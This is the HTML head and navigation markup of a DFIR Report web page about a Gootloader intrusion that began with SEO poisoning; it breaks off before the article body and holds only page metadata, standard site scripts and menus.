<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<title>SEO Poisoning to Domain Control: The Gootloader Saga Continues &#8211; The DFIR Report</title>
			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 <meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="a047e49feedfc240b75aad7c-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='jetpack_related-posts-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='freenews-style-css' href='https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2' type='text/css' media='all' />
<style id='freenews-style-inline-css' type='text/css'>
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='font-awesome-css' href='https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-google-fonts-css' href='https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css' type='text/css' media='all' />
<link rel='stylesheet' id='sharedaddy-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<script type="a047e49feedfc240b75aad7c-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/28305" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/" />
<link rel='shortlink' href='https://thedfirreport.com/?p=28305' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F02%2F26%2Fseo-poisoning-to-domain-control-the-gootloader-saga-continues%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F02%2F26%2Fseo-poisoning-to-domain-control-the-gootloader-saga-continues%2F&#038;format=xml" />

		<!-- GA Google Analytics @ https://m0n.co/ga -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="a047e49feedfc240b75aad7c-text/javascript"></script>
		<script type="a047e49feedfc240b75aad7c-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>

	<script type="a047e49feedfc240b75aad7c-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=FC75F3E2EF751E7B1969FC85CFA21D67');
</script>	<style>img#wpstats{display:none}</style>
		<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="SEO Poisoning to Domain Control: The Gootloader Saga Continues" />
<meta property="og:url" content="https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/" />
<meta property="og:description" content="Key Takeaways In February 2023, we detected an intrusion that was initiated by a user downloading and executing a file from a SEO-poisoned search result, leading to a Gootloader infection. Around n…" />
<meta property="article:published_time" content="2024-02-26T00:39:52+00:00" />
<meta property="article:modified_time" content="2024-03-19T14:15:04+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2024/02/19530-005-1.png" />
<meta property="og:image:width" content="6000" />
<meta property="og:image:height" content="3375" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="SEO Poisoning to Domain Control: The Gootloader Saga Continues" />
<meta name="twitter:card" content="summary" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>

<body class="post-template-default single single-post postid-28305 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
	<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	
	<header id="masthead" class="site-header">
		<div id="main-header" class="main-header">
			<div class="navigation-top">
        		<div class="wrap">
            	<div id="site-header-menu" class="site-header-menu">
               	<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
							    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>						 </nav><!-- #site-navigation -->
           		</div>
        		</div><!-- .wrap -->
			</div><!-- .navigation-top -->
			       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			<div class="main-header-brand">
				<div class="header-brand">
					<div class="wrap">
						<div class="header-brand-content">
							    <div class="site-branding">
                <div class="site-branding-text">

                           <p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
                                <p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
            
        </div><!-- .site-branding-text -->
    </div><!-- .site-branding -->


							<div class="header-right">
								<div class="header-banner">

																	</div><!-- .header-banner -->
							</div><!-- .header-right -->
						</div><!-- .header-brand-content -->
					</div><!-- .wrap -->
				</div><!-- .header-brand -->

				<div id="nav-sticker">
					<div class="navigation-top">
						<div class="wrap">
							<div id="site-header-menu" class="site-header-menu">
								<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
								    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
